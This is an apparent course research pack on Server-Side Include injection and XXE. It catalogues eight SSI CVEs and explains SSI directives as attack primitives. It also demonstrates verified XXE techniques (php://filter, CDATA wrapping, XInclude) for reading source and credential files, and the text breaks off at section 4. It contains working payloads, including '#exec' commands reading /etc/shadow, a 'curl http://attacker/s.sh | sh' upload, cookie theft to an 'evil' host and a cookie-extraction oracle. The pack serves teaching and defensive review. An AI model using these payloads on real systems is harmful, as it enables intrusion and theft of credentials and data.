# Server-Side Includes (SSI) and XML External Entities (XXE)

Research pack for the web-security assignment. Everything marked **[verified]** was
reproduced locally in `research/lab/` on **PHP 8.4.19 / libxml 2.9.14** and
**OpenJDK 21.0.10**; the raw output is quoted alongside each claim. Everything else is
sourced from vendor documentation or the CVE record and is cited.

> **Scope.** Written for authorised lab work, CTFs and defensive review. Every payload
> here should only be fired at a system you own or have written permission to test.

## Contents

1. [SSI CVE catalogue — one per team](#1-ssi-cve-catalogue--one-per-team)
2. [SSI directives beyond `include` / `printenv` / `config` / `echo` / `exec`](#2-ssi-directives-beyond-include--printenv--config--echo--exec)
3. [Reading application source code with XXE](#3-reading-application-source-code-with-xxe)
4. [Reading files without `file://`](#4-reading-files-without-file)
5. [Blind XXE and data exfiltration](#5-blind-xxe-and-data-exfiltration)
6. [Defences — what actually works](#6-defences--what-actually-works)
7. [Reproducing the lab](#7-reproducing-the-lab)
8. [Sources](#8-sources)

---

## 1. SSI CVE catalogue — one per team

Eight distinct, real CVEs. They deliberately span four different bug classes so no two
teams end up presenting the same story:

| # | CVE | Component | Bug class | Severity |
|---|-----|-----------|-----------|----------|
| 1 | CVE-2025-58098 | Apache httpd ≤ 2.4.65 + `mod_cgid` | Argument injection into `#exec cmd` (CWE-201) | ASF: *moderate* |
| 2 | CVE-2026-56434 | nginx `ngx_http_ssi_module` 0.8.11–1.31.2 | Use-after-free (CWE-416) | 8.3 CVSS 4.0 / 6.5 CVSS 3.1 |
| 3 | CVE-2019-0221 | Apache Tomcat SSI `printenv` | Reflected XSS (CWE-79) | 6.1 |
| 4 | CVE-2009-1195 | Apache httpd ≤ 2.2.11 `AllowOverride` | Security-control bypass → `#exec` | local privilege escalation |
| 5 | CVE-2004-0940 | Apache 1.3.x–1.3.32 `mod_include` `get_tag()` | Buffer overflow | code execution as the httpd user |
| 6 | CVE-2001-0506 | IIS 4.0/5.0 `ssinc.dll` | Buffer overrun | local → SYSTEM (MS01-044) |
| 7 | CVE-2024-3788 | WBSAirback 21.02.04 | SSI injection (CWE-97) | 6.6 |
| 8 | CVE-2023-1728 | Fernus LMS < 23.04.03 | Upload → OS command + SSI injection | 9.8 |

### 1.1 CVE-2025-58098 — Apache httpd passes the query string to `#exec cmd`

**Affected:** Apache HTTP Server < 2.4.66, when SSI is enabled *and* `mod_cgid` is loaded
(`mod_cgi` is not affected). Fixed in 2.4.66, released 4 Dec 2025. Reported by
Anthony Parfenov (United Rentals). ASF classifies it CWE-201 *Insertion of Sensitive
Information Into Sent Data*, severity **moderate**.

**Root cause — read from the patch.** The upstream diff between the 2.4.65 and 2.4.66
tags shows the fix is entirely in `modules/generators/mod_cgid.c`; `mod_include.c` is
byte-for-byte identical between the two releases:

```c
-  argv = (const char * const *)create_argv(r->pool, NULL, NULL, NULL, argv0, r->args);
+  /* Do not pass args in case of SSI requests */
+  argv = (const char * const *)create_argv(r->pool, NULL, NULL, NULL,
+                                           argv0,
+                                           cgid_req.req_type == SSI_REQ ? NULL : r->args);
```

`create_argv()` implements the CGI "command line arguments" rule of RFC 3875 §4.4: if the
query string contains **no `=`**, it is split on `+`, each word is URL-decoded and then
passed through `ap_escape_shell_cmd()`. For an SSI request `mod_cgid` sets
`cmd_type = APR_SHELLCMD`, and APR's shell path concatenates every argv element into a
single string handed to `/bin/sh -c`. Net effect: attacker-supplied words are appended to
the command line of whatever the page executes.

**What the attacker actually controls.** `ap_escape_shell_cmd()` backslash-escapes
``& ; ` ' " | * ? ~ < > ^ ( ) [ ] { } $ \ \n \r %`` — so this is **not** free-form shell
metacharacter injection. What you get is *argument* injection: extra whitespace-separated
tokens appended to the command. Several third-party trackers label this "RCE"; that is
only reachable indirectly, via a target binary whose flags are dangerous.

**Exploit scenario.** A status page contains

```html
<!--#exec cmd="/usr/bin/tail -n 20 /var/log/app/current.log" -->
```

The attacker requests `/status.shtml?/etc/shadow` (note: no `=` anywhere in the query
string, or the code path is skipped). The child runs:

```sh
/bin/sh -c "/usr/bin/tail -n 20 /var/log/app/current.log /etc/shadow"
```

`tail` happily prints the second file. Escalating from file read to execution is the
classic argument-injection game — pick a target binary that has an "execute this" flag
(`tar --checkpoint-action=exec=`, `find -exec`, `awk 'BEGIN{system(...)}'`, `curl -o`,
`zip --unzip-command`). Secondary impact matching the ASF's CWE-201 rating: the raw query
string lands in the process command line, so it is visible in `ps`, in audit logs, and to
any other local user.

**Discussion angles.** Why does `mod_cgi` escape this and `mod_cgid` not? Why is a
40-year-old CGI convention (RFC 3875 §4.4) still live in 2025? Why is the ASF's
"moderate / information disclosure" rating arguably right and the press's "critical RCE"
arguably wrong?

### 1.2 CVE-2026-56434 — use-after-free in nginx's SSI filter

**Affected:** nginx OSS 0.8.11 – 1.31.2 (fixed in 1.31.3 mainline / 1.30.4 stable);
NGINX Plus R33+ up to R36 P7 / 37.0.3.1. CWE-416. CVSS 4.0 **8.3**, CVSS 3.1 6.5. No
workaround — patching is the only fix.

**Trigger condition:** `ssi on;` **and** `proxy_pass` **and** `proxy_buffering off;` all
in the same location. With buffering off, nginx streams the upstream response through the
SSI filter chunk by chunk; a crafted upstream response drives the filter into freeing a
buffer that is still referenced.

**Exploit scenario.** The attacker is not the client — it is whoever controls the
*upstream* response. Realistically: a MITM on a plaintext `proxy_pass http://backend`
hop (a flat datacentre network, a compromised service-mesh sidecar, a poisoned DNS entry
for the upstream name), or an upstream application that reflects attacker-controlled bytes
into a response that nginx will SSI-parse. The result is limited memory corruption in the
worker process — enough to modify memory contents or to force worker restarts. Because
each worker holds many clients' connections, repeated restarts are an availability
attack; the memory-modification primitive is the interesting half (F5 explicitly notes it
is a data-plane-only issue, no control-plane exposure).

**Discussion angles.** Why does turning *off* buffering create a lifetime bug?
`proxy_buffering off` is standard advice for streaming/SSE endpoints, so the "insecure"
config is one people are told to use. And note the vulnerable range starts at 0.8.11 —
this bug survived roughly 16 years.

### 1.3 CVE-2019-0221 — XSS in Tomcat's SSI `printenv`

**Affected:** Tomcat 9.0.0.M1–9.0.0.17, 8.5.0–8.5.39, 7.0.0–7.0.93. Fixed in 7.0.94 /
8.5.40 / 9.0.19. CVSS 6.1.

**Root cause.** Tomcat's SSI implementation HTML-escapes values for `#echo` (whose
`encoding` parameter defaults to `entity`) but `#printenv` dumps every variable with no
escaping at all. Request-derived variables — `QUERY_STRING`, `HTTP_USER_AGENT`,
`DOCUMENT_URI` — therefore reach the response body raw.

**Exploit scenario.** A `debug.shtml` left in a staging build contains `<!--#printenv -->`.
The attacker sends `GET /debug.shtml?<script>fetch('//evil/'+document.cookie)</script>`
and hands the link to a logged-in administrator. The script executes on the application's
origin: session theft, CSRF-token exfiltration, admin actions.

**Discussion angles.** The vendor rated this "low" on three grounds — SSI is off by
default, almost nobody uses it, and `printenv` is a debugging directive that has no place
in production. That is a genuinely defensible risk-acceptance argument, and a good thing
for a team to argue both sides of. It also cleanly illustrates why a per-directive
encoding default (`entity` on `echo`) is worthless if a sibling directive skips it.

### 1.4 CVE-2009-1195 — `AllowOverride Options=IncludesNOEXEC` doesn't restrict anything

**Affected:** Apache httpd ≤ 2.2.11.

**Root cause.** `IncludesNOEXEC` is the SSI safety valve: it enables SSI but disables
`#exec` and the execution of CGI via `#include virtual`. An administrator who writes
`AllowOverride Options=IncludesNOEXEC` intends "tenants may switch SSI on, but only the
safe subset". A logic error in the `Options`/`AllowOverride` merge meant that permitting
`IncludesNOEXEC` also permitted plain `Includes` — the full, `#exec`-enabled variant.

**Exploit scenario.** Classic shared-hosting / multi-tenant escalation. A low-privileged
tenant who can write files into their own docroot drops a `.htaccess`:

```apache
Options +Includes
AddType text/html .shtml
AddOutputFilter INCLUDES .shtml
```

and then a `pwn.shtml` containing `<!--#exec cmd="/bin/cat /home/othertenant/config.php" -->`.
Requesting the page runs the command as the httpd user, which can read every vhost on the
box. The tenant has escaped their own account into the shared web-server identity.

**Discussion angles.** This is a *policy-enforcement* bug, not a memory or parsing bug —
the parser worked exactly as designed and the access-control layer lied about what it had
allowed. Good material on why "defence in depth" means not letting a single boolean merge
decide whether command execution is reachable.

### 1.5 CVE-2004-0940 — buffer overflow in `mod_include`'s `get_tag()`

**Affected:** Apache 1.3.x through 1.3.32; fixed in 1.3.33.

**Root cause.** `get_tag()` parses the `name=value` pairs inside an SSI element. Its
length accounting for *escaped* characters inside a tag string is wrong, so a
sufficiently long / carefully escaped attribute overflows a fixed-size stack buffer.

**Exploit scenario.** The attacker must be able to place an SSI-parsed document on the
server — again the shared-hosting model, or any application with an upload directory that
is inside an `Options +Includes` tree and serves `.shtml`. Uploading a malformed SSI
document and fetching it corrupts the stack of the httpd child and yields code execution
as the `apache` user. Public exploits exist (Exploit-DB 587, 24694).

**Discussion angles.** A memory-safety bug in a *text templating* feature — the SSI parser
is C code chewing on attacker-influenced strings, which is exactly the shape of bug the
industry spent the following twenty years trying to design out. Pairs nicely with
CVE-2026-56434 (§1.2) as "the same class, 22 years apart, different server".

### 1.6 CVE-2001-0506 — IIS `ssinc.dll` SSI buffer overrun

**Affected:** IIS 4.0 and 5.0. Microsoft bulletin MS01-044. This is the CVE OWASP itself
cites on its SSI Injection page.

**Root cause.** IIS maps `.stm`, `.shtm` and `.shtml` to `ssinc.dll`. When the DLL resolves
an SSI `#include` it appends the directory name to the supplied filename; an over-long
filename overflows the destination buffer during that concatenation.

**Exploit scenario (as OWASP documents it).** Create

```html
<!--#include file="UUUUUUUU…UU"-->
```

with more than 2049 `U`s, then get IIS to parse it. Where the attacker cannot upload,
OWASP chains it with a path-traversal / remote-include primitive in the app itself:

```
http://vulnerable.example/index.asp?page=http://attacker.example/ssi_over.shtml
```

A blank response indicates the overflow fired. Because `ssinc.dll` ran in the Local System
context, successful exploitation is a straight jump from "can write web content" to full
machine compromise.

**Discussion angles.** The historical value here is the *privilege model*: a templating
DLL running as SYSTEM. Compare with modern IIS application-pool isolation and with
Apache's `IncludesNOEXEC` — two different answers to "how much authority should a
template engine hold?"

### 1.7 CVE-2024-3788 — SSI injection in WBSAirback

**Affected:** WBSAirback 21.02.04 (backup appliance). CVSS 3.1 **6.6**
(`AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:L/A:L`). Titled by the CNA "Improper Neutralization of
Server-Side Includes (SSI) vulnerability in WBSAirback".

**Root cause.** The `License` field reachable through `/admin/CDPUsers` is stored and later
rendered into a page that the server SSI-parses, with no neutralisation of the `<!--#`
sequence.

**Exploit scenario.** A high-privilege but non-root operator (note `PR:H` — this is an
*insider / post-compromise* escalation, not a pre-auth bug) pastes

```html
<!--#exec cmd="id; cat /etc/shadow" -->
```

into the licence field. The next time any user loads the affected admin page, the command
runs as the appliance's web-server user. The `S:C` (scope changed) in the vector is the
interesting part: the injected directive executes outside the security scope of the
component that stored it.

**Discussion angles.** The purest textbook CWE-97 in the list: user input → stored →
SSI-parsed. Ideal for demonstrating the OWASP detection method (probe with
`< ! # = / . " - >`), and for arguing about whether `PR:H` bugs in appliances deserve
their low-ish scores when the appliance is a backup server holding everyone's data.

### 1.8 CVE-2023-1728 — Fernus LMS: upload chained to SSI injection

**Affected:** Fernus Informatics LMS before 23.04.03. CVSS 3.1 **9.8**
(`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`). CWE-434, with the CVE text explicitly stating the
upload "allows OS Command Injection, Server Side Include (SSI) Injection".

**Root cause.** Unrestricted upload of files with a dangerous type. The upload filter does
not reject SSI-parsed extensions, and the upload directory is served by a handler that
parses them.

**Exploit scenario.** Unauthenticated (`PR:N`) attacker uploads `avatar.shtml`:

```html
<!--#exec cmd="curl http://attacker/s.sh | sh" -->
```

then requests it back from the uploads path. The server executes the directive on the
request that renders the file — full pre-auth RCE on a learning-management system holding
student records.

**Discussion angles.** This is the "extension allow-list" lesson: teams usually block
`.php`, `.jsp`, `.asp` and forget `.shtml` / `.shtm` / `.stm`. Also a good vehicle for the
defence discussion — serving uploads from a separate origin with SSI parsing disabled
would have killed it regardless of the filter bug.

### Suggested team split

| Theme | CVEs |
|---|---|
| Server-core logic / injection | CVE-2025-58098, CVE-2009-1195 |
| Memory safety in the SSI parser | CVE-2026-56434, CVE-2004-0940, CVE-2001-0506 |
| Output encoding | CVE-2019-0221 |
| Application-level CWE-97 | CVE-2024-3788, CVE-2023-1728 |

---

## 2. SSI directives beyond `include` / `printenv` / `config` / `echo` / `exec`

Excluding the five named in the brief, this is what remains across the four major SSI
implementations.

| Directive | Apache `mod_include` | nginx | Tomcat | IIS |
|---|---|---|---|---|
| `fsize` | yes | — | yes | yes |
| `flastmod` | yes | — | yes | yes |
| `set` | yes | yes | yes | — |
| `if` / `elif` / `else` / `endif` | yes (`ap_expr`) | yes (1 nesting level) | yes (legacy grammar) | — |
| `comment` | yes (2.4.21+) | — | — | — |
| `block` / `endblock` | — | yes | — | — |
| `perl` | via mod_perl | — | — | — |

nginx's SSI module is deliberately incomplete: it has **no `exec` and no `fsize`/`flastmod`**,
which removes the command-execution sink entirely but leaves everything below.

### 2.1 `fsize` — file-size oracle

```html
<!--#fsize file="report.pdf" -->
<!--#fsize virtual="/downloads/report.pdf" -->
```

Output format follows `config sizefmt` (`bytes` or `abbrev`).

**The two attributes are not equally dangerous.** `file=` is deliberately restricted — the
path may not start with `/` and may not contain `../`, so it cannot leave the current
directory. `virtual=` takes a **URL-path**, which is resolved through the server's whole
mapping layer: `Alias`, `ScriptAlias`, `Redirect`, mounted webapps. Anything the server can
map, `virtual=` can measure.

**Impact.**

- **Existence + size oracle for files with no readable content.** `<!--#fsize virtual="/.git/config" -->`
  distinguishes "not there" (error string) from "there, 312 bytes". Sweep for
  `.env`, `config.php.bak`, `WEB-INF/web.xml`, `backup.sql`, `id_rsa`.
- **Size as a side channel.** Where the size of a resource is a function of a secret —
  a generated report that includes only the records you may see, a compressed response, a
  key file whose length reveals the algorithm — the size alone leaks. This is the SSI
  analogue of a CRIME/BREACH-style oracle without needing to read a byte.
- **Cross-application reach on Tomcat.** Tomcat's `isVirtualWebappRelative` defaults to
  **false**, meaning `virtual=` paths are resolved relative to the *server* root, not the
  context root. An SSI injection inside one webapp can therefore probe files belonging to
  every other deployed webapp on the same Tomcat.
- **Explicitly documented note:** for a CGI script, `fsize virtual=` returns the size of
  the *script file*, not of its output — i.e. it reads metadata of code you are not
  supposed to be able to fetch.

### 2.2 `flastmod` — timestamp oracle

```html
<!--#flastmod file="index.html" -->
<!--#flastmod virtual="/WEB-INF/web.xml" -->
```

Same `file=` / `virtual=` split and the same restrictions as `fsize`; the output format
comes from `config timefmt` (a `strftime(3)` string).

**Impact.**

- **Existence oracle** with the same reach as `fsize`, and a second, independent signal
  when sizes collide.
- **Patch-state fingerprinting.** The mtime of a framework file tells you when the app was
  last deployed or patched, which maps directly onto "is CVE-X fixed here?" — useful for
  choosing an exploit before firing one.
- **Write confirmation for a blind upload.** If you have an upload primitive but no way to
  see the result, `flastmod` on the guessed path confirms both the path and the moment
  your file landed. That converts a blind file-write into a reliable one.
- **Deployment-schedule intelligence.** Sampling mtimes across a site reveals release
  cadence and which components are hand-edited on the box.
- Combined with `config timefmt="%s"`, output is a raw epoch integer — convenient for
  scripted differential probing.

### 2.3 `set` — variable assignment, and the sleeper of the whole set

```html
<!--#set var="category" value="help" -->
<!--#set encoding="none"  var="x" value="$QUERY_STRING" -->
<!--#set decoding="base64" var="y" value="PCEtLSNleGVjIC4uLg==" -->
```

Attributes: `var`, `value`, and — added in 2.4 — `decoding` and `encoding`, each accepting
`none`, `url`, `urlencoded`, `base64`, `entity`, comma-separated for multiple passes.
Both **must appear before `var`** in the element. Decodings are stripped first, then
encodings applied.

This looks like the most boring directive in the list. It is the most useful one.

**Impact.**

- **`decoding=` is a filter/WAF bypass primitive.** The whole point of the attribute is to
  strip an encoding layer *inside the server*. A payload that a WAF, an input validator or
  an HTML sanitiser never recognised — because it was base64 or percent-encoded when it
  went past them — is decoded after the fact. Any signature that matches on the literal
  string `<!--#exec` is defeated by carrying the payload through `set decoding="base64"`.
- **`encoding="none"` re-enables XSS.** Apache's default output encoding is `entity`;
  writing `encoding="none"` opts out. In Tomcat's docs the same warning is explicit:
  *"Using an encoding other than entity can lead to security issues."* This is precisely
  the class of bug CVE-2019-0221 (§1.3) was.
- **Environment poisoning.** Per the Apache manual, variables created with `set` are
  **exported into the request environment** and are visible to `reqenv()`/`v()` in later
  expressions — and to anything downstream that reads the request env: `#exec` children,
  CGI scripts, `mod_rewrite` conditions, env-based access control (`Require env=...`),
  `SetEnvIf`-driven logic. One `set` can therefore rewrite a decision made much later in
  the request.
- **Second-order injection.** Variable substitution (`$var`, `${var}`) is performed inside
  quoted strings in `config`, `exec`, `flastmod`, `fsize`, `include`, `echo` and `set`
  itself. A value the attacker controls in one directive becomes an operand of another —
  the SSI equivalent of a gadget chain. `<!--#set var="p" value="$QUERY_STRING" -->`
  followed anywhere later by `<!--#include virtual="/x/$p" -->` is a path-traversal sink.
- **Cheap self-reference:** values may reference other variables, so `set` gives you string
  concatenation, and with `if` (below) you have branch + state, i.e. a very small
  programming language reachable from a single injected comment.

### 2.4 `if` / `elif` / `else` / `endif` — the boolean oracle

```html
<!--#if expr="test_condition" -->  …
<!--#elif expr="test_condition" --> …
<!--#else --> …
<!--#endif -->
```

`endif` is mandatory; `elif`/`else` are optional. **Three different expression grammars
exist and teams should not mix them up:**

- **Apache 2.4** uses `ap_expr` (the same language as `<If>` and `mod_rewrite`'s
  `RewriteCond expr=`). `mod_include` additionally exposes the shorthand `v()`.
- **Apache with `SSILegacyExprParser on`** falls back to the 2.2 grammar.
- **Tomcat** implements the legacy grammar only. Reading its `ExpressionTokenizer`, the
  supported tokens are exactly `=`, `!=`, `<`, `<=`, `>`, `>=`, `&&`, `||`, `!`, `(`, `)`
  and strings — a right-hand side of the form `/regex/` is a regex match. There are **no
  file-test operators at all**.

**What `ap_expr` gives an attacker inside `mod_include`:**

| Available | Not available in `mod_include` |
|---|---|
| `req()`, `resp()`, `reqenv()`/`v()`, `osenv()`, `note()`, `env()` | `file()` — read a file's contents |
| `base64()`, `unbase64()`, `md5()`, `sha1()` | `filesize()` |
| `escape()`, `unescape()`, `escapehtml()`, `replace()`, `tolower()`, `toupper()`, `ldap()` | `filemod()` |
| `-U` / `-A` (URL accessible?), `-F` (file accessible?), `-R` (client IP in CIDR), `-n`, `-z`, `-T` | `-d`, `-e`, `-f`, `-s`, `-L`, `-h` |
| `=~`, `!~`, `-strmatch`, `-fnmatch`, `-ipmatch`, `-in`, all numeric comparisons | |

The right-hand column matters. Apache's expression manual marks `file`, `filesize`,
`filemod` and the `-d -e -f -s -L -h` operators **"restricted"**, and states plainly:
*"The operators marked as 'restricted' are not available in some modules like
`mod_include`."* So the frequently-repeated payload
`<!--#if expr="file('/etc/passwd')" -->` **does not read `/etc/passwd` on Apache**. Say so
in the presentation; it is the kind of detail that separates a real write-up from a
copy-pasted one.

**Impact of what *is* available.**

- **A one-bit read channel out of any SSI injection.** Even with `exec` disabled, `echo`
  filtered and no output reflected, a conditional whose two branches differ turns any
  variable into an extractable secret, one character per request:

  ```html
  <!--#if expr="reqenv('HTTP_COOKIE') =~ /^SESSION=a/" -->Y<!--#else -->N<!--#endif -->
  ```

  Binary-search each position with `-strmatch` and you recover the value in
  `O(log₂(alphabet) × length)` requests. Same trick against `osenv()` for process
  environment variables (`AWS_SECRET_ACCESS_KEY`, `DB_PASSWORD`).
- **`-U` / `-A` are an authorisation-aware existence oracle.** They answer "is this URL
  reachable *through all of the server's configured access controls*" by issuing an
  **internal subrequest**. That maps the internal URL space including endpoints an
  external request would be blocked from — admin panels behind `Require ip`, internal-only
  vhost aliases. `-F` does the same for filesystem paths.
- **`-U`/`-F` are also a DoS lever.** The Apache manual's own words: *"This uses an
  internal subrequest to do the check, so use it with care — it can impact your server's
  performance!"* A single injected page containing a loop of `-U` tests amplifies one
  request into hundreds of internal subrequests.
- **`unbase64()` / `unescape()` are decode-after-the-filter primitives**, the same bypass
  shape as `set decoding=`.
- **`-R "10.0.0.0/8"`** reveals how the server classifies the client — useful for finding
  out which proxy header the server actually trusts.
- **nginx caveat:** its `if` supports only *one* nesting level, and expressions are limited
  to variable-existence, `=`/`!=` against text, and `=` / `!=` against a `/regex/` — but the
  regex supports positional and named captures which are then readable through `echo`,
  giving a genuine extract-and-reflect primitive.
- **`ssi_value_length` (default 256)** caps parameter length in nginx — a real constraint
  when building payloads there.

### 2.5 `comment` — the quiet canary (Apache 2.4.21+)

```html
<!--#comment Blah Blah Blah -->
<!--#comment text="Blah Blah Blah" -->
```

It produces no output. That is exactly what makes it useful offensively.

**Impact.**

- **Zero-noise detection.** Injecting `<!--#comment x -->` and observing that it
  *disappears* from the response proves the SSI filter is parsing your input — without
  emitting a command, without touching the filesystem, without tripping a WAF rule that
  looks for `exec`/`include`, and without leaving anything visible for a defender reviewing
  the rendered page. If it comes back verbatim, SSI is not parsing that sink.
- **Version fingerprinting.** It exists only from 2.4.21. A server that swallows
  `#comment` but rejects it as an unknown element on a sibling host tells you which of the
  two is older, which narrows CVE applicability before you commit to an exploit.
- The only defensive note: since it renders nothing, `#comment` in an injected payload is
  invisible in a page diff. Detection has to be at the input, not the output.

### 2.6 `block` / `endblock` — nginx only

```html
<!--# block name="one" -->fallback content<!--# endblock -->
<!--# include virtual="/remote/body.php" stub="one" -->
```

Defines a named stub that `include` renders **if the subrequest returns an empty body or
errors**. Blocks may contain other SSI commands.

**Impact.**

- **Error oracle for internal subrequests.** Because the stub renders precisely on failure,
  `block` + `include stub=` is a clean success/failure signal for probing internal
  endpoints — the nginx equivalent of Apache's `-U`.
- **Staged payloads.** Content that only renders in a specific server state is a way to
  keep a payload dormant until a condition holds, and to smuggle markup past a filter that
  inspects rendered output rather than the template.
- The related non-standard `include` parameters are worth naming even though `include`
  itself is out of scope: `set="var"` writes a subrequest's **response body into a
  variable** (bounded by `subrequest_output_buffer_size`), which upgrades nginx SSI from
  "include a page" to "fetch an internal URL and read it back" — a first-class SSRF-with-
  response primitive. `wait="yes"` serialises subrequests, which makes exploitation
  deterministic.

### 2.7 `perl` — mod_perl only

```html
<!--#perl sub="Package::handler" arg="value" -->
```

Available when httpd is built/configured with mod_perl SSI support (historically
`-DUSE_PERL_SSI`). It calls a Perl subroutine directly in the server's embedded
interpreter.

**Impact.** In-process code execution with no `fork`, no subrequest, and none of the
access checks that `include virtual` performs — mod_perl's documentation sells exactly
that as the performance benefit, which is the same sentence read as a threat model. Any
sub reachable in the interpreter's namespace becomes callable from injected markup, so the
blast radius is "every module loaded into the server", not "every binary in `$PATH`".

### 2.8 Configuration directives worth knowing

These are `mod_include`'s httpd-config directives rather than in-page elements, but they
decide what the in-page elements can do:

| Directive | Why it matters |
|---|---|
| `Options +Includes` vs `IncludesNOEXEC` | `IncludesNOEXEC` keeps SSI but kills `#exec` and CGI execution via `#include virtual`. This is the control CVE-2009-1195 (§1.4) broke. |
| `SSIStartTag` / `SSIEndTag` | Default `<!--#` and `-->`. If a site sets `SSIStartTag "<%"`, every payload in every cheat sheet silently fails — and conversely a non-default tag can collide with an existing template syntax and widen the injection surface. |
| `SSILegacyExprParser` | Switches `#if` back to the 2.2 grammar; changes which of the operators in §2.4 exist. |
| `SSIUndefinedEcho` | Default `(none)`. The *string* returned for an undefined variable is itself an oracle: it distinguishes "unset" from "set to empty". |
| `SSIETag` / `SSILastModified` | Off by default because SSI output is dynamic; turning them on re-introduces cacheability, and therefore cache-poisoning reach, for attacker-influenced output. |
| `XBitHack on\|off\|full` | Makes any `text/html` file with the user-execute bit set SSI-parsed. `full` additionally serves a `Last-Modified` from the file — the manual warns to use it carefully with dynamic content, i.e. it lets caches store SSI output. |
| Tomcat `allowExec` (default `false`), privileged contexts only | Tomcat ships SSI disabled and `#exec` off; both must be deliberately enabled. |

---

## 3. Reading application source code with XXE

### 3.1 Why the naive payload fails

Application source is not XML-safe. Feed it into an entity and the parser chokes on the
first `<?`, `<` or `&` it meets. **[verified]** — parsing
`<!ENTITY xxe SYSTEM "…/app.php">` where `app.php` starts with `<?php`:

```
RAW php source via bare path   => (parse failed)  [ParsePI: PI php never end ...]
```

and where the file merely contains an `&`, the CDATA route fails differently:

```
ERR: EntityValue: '&' forbidden except for entities references
```

So "read `/etc/passwd`" works and "read `index.php`" does not, for the same payload. Three
techniques get around it.

### 3.2 Technique 1 — `php://filter` base64 (PHP targets)

Wrap the file in a stream filter so the parser only ever sees `A–Z a–z 0–9 + / =`:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
]>
<r>&xxe;</r>
```

**[verified]**

```
D php://filter base64        => U0VDUkVUX0ZMQUc9Y3UtY3J5cHRvLTIwMjYKZGJfcGFzc3dvcmQ9UEBzc3cwcmQK
E php://filter read= form    => PD9waHAKJGRicGFzcyA9ICJodW50ZXIyIjsgLy8gc291cmNlIHdpdGggPCAmID4gY2hhcn…
F php://filter on raw source => (parse failed)
```

Note line **F**: `php://filter/resource=…` with no conversion is just `file://` with extra
steps and fails identically. The base64 conversion is the whole point.

`read=convert.base64-encode/resource=` is an equivalent spelling. Other useful conversions:
`convert.quoted-printable-encode`, `string.rot13` (only helps if the source has no XML
metacharacters — **[verified]** it still fails on real PHP source).

**Filter chains do not survive libxml2. [verified]** PHP itself accepts
`zlib.deflate|convert.base64-encode`:

```
$ php -r '…file_get_contents("php://filter/zlib.deflate|convert.base64-encode/resource=app.php")…'
string(40) "DYxNCoAgFAb3nuJDHlIrqW1WZ/EvnpsULVpEd8/V"
```

but inside XXE the `|` breaks libxml2's URI parser, and percent-encoding it as `%7C`
silently drops the chain rather than applying it:

```
filter chain deflate+base64      => (parse failed)  [Invalid URI: php://filter/zlib.deflate|convert…]
php://filter chain (%7C encoded) => ParsePI: PI php never end …   (chain not applied)
```

**Use exactly one filter inside XXE.**

### 3.3 Technique 2 — CDATA wrapping (parser-agnostic)

Build the string `<![CDATA[` + file + `]]>` out of three parameter entities so the file
content lands inside a CDATA section, where `<` and `>` are literal data. The concatenation
must happen in an **external** DTD (see §5.2 for why).

`evil.dtd`:

```xml
<!ENTITY % start "<![CDATA[">
<!ENTITY % data  SYSTEM "/var/www/html/config.php">
<!ENTITY % end   "]]>">
<!ENTITY % joined "<!ENTITY all '%start;%data;%end;'>">
```

Payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % dtd SYSTEM "http://attacker.example/evil.dtd">
  %dtd;
  %joined;
]>
<r>&all;</r>
```

**[verified] — works, with one hard limit.** Against a file containing `<`, `>` and `"`
but no `&`:

```
=== CDATA wrap, file with < > but no & ===
  | <?php
  | class Auth { // no ampersands here
  |   public $key = "AKIA-EXAMPLE";
  |   function ok($u) { if ($u->id > 0) return true; }
  | }
```

Against the same technique on a file containing `&&`:

```
ERR: EntityValue: '&' forbidden except for entities references
ERR: Entity 'all' not defined
```

**Conclusion: CDATA wrapping neutralises `<` and `>` but not `&` or `%`,** because the
file's bytes are spliced into an *entity value*, where those two characters are still
markup. Real-world source (`&&`, `$a & $b`, `&amp;` in templates, HTML entities) will
usually contain one. Treat CDATA as the fallback for Java/.NET where `php://filter` does
not exist, not as a general solution — and expect it to fail on roughly any non-trivial
PHP/JS file.

### 3.4 Technique 3 — XInclude with `parse="text"` (the clean answer)

This is the technique most write-ups skip, and it is better than both of the above.

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="/var/www/html/config.php"/>
</root>
```

`parse="text"` tells the processor to insert the resource as **character data** rather than
parse it as XML, so the file's `<`, `&` and `>` are simply escaped on the way in.

**[verified] — reads raw source with no encoding wrapper at all, in both stacks:**

```
--- Q1: does XInclude parse=text read RAW source (no php://filter)? ---
XInclude text, raw app.php (has < & >)  => n=1 GOT: <?php\n$dbpass = "hunter2"; // source with < & > chars\nif ($a…
```

```
XIncludeAware=false (no DOCTYPE, bare path) => (nothing)
XIncludeAware=true  (no DOCTYPE, bare path) => LEAKED: SECRET_FLAG=cu-crypto-2026\ndb_password=P@ssw0rd
```

Three advantages over classic XXE: it needs **no `DOCTYPE`** (so it survives
`disallow-doctype-decl`), it needs **no entity substitution** (so it survives
`LIBXML_NOENT` being absent), and it handles arbitrary bytes. Its one requirement is that
the processor is XInclude-aware — `setXIncludeAware(true)` in Java, an explicit
`->xinclude()` call in PHP DOM, on by default in some XML libraries and pipelines.

It also composes with `php://filter` when you want base64 anyway. **[verified]**

```
=== XInclude + php://filter (source code) === (substitutions=1)
  | PD9waHAKJGRicGFzcyA9ICJodW50ZXIyIjsgLy8gc291cmNlIHdpdGggPCAmID4gY2hhcnMK…
```

### 3.5 Where to point it

Reading source is only useful if you know the path. Useful anchors:

| Target | Why |
|---|---|
| `/proc/self/cwd/<file>` | Linux: resolves relative to the *process's* working directory — sidesteps not knowing the docroot |
| `/proc/self/environ`, `/proc/self/cmdline` | env vars and argv of the parsing process; often carries `DB_PASSWORD`, `SECRET_KEY` |
| `/proc/self/maps`, `/proc/self/fd/N` | loaded paths; open file descriptors (including deleted files still held open) |
| `WEB-INF/web.xml`, then `WEB-INF/classes/…` | Java: the deployment descriptor names the servlet classes; enumerate from there |
| `application.properties`, `application.yml` | Spring Boot credentials |
| `.env`, `config.php`, `wp-config.php`, `settings.py` | PHP / WordPress / Django credentials |
| `/etc/apache2/sites-enabled/*.conf`, `/etc/nginx/nginx.conf` | resolves `DocumentRoot` when nothing else does |
| `pom.xml`, `composer.json`, `package.json` | dependency versions → known-CVE selection |

For Java specifically, `jar:file:///path/app.war!/WEB-INF/web.xml` reads straight out of a
deployed archive (**[verified]**, §4).

---

## 4. Reading files without `file://`

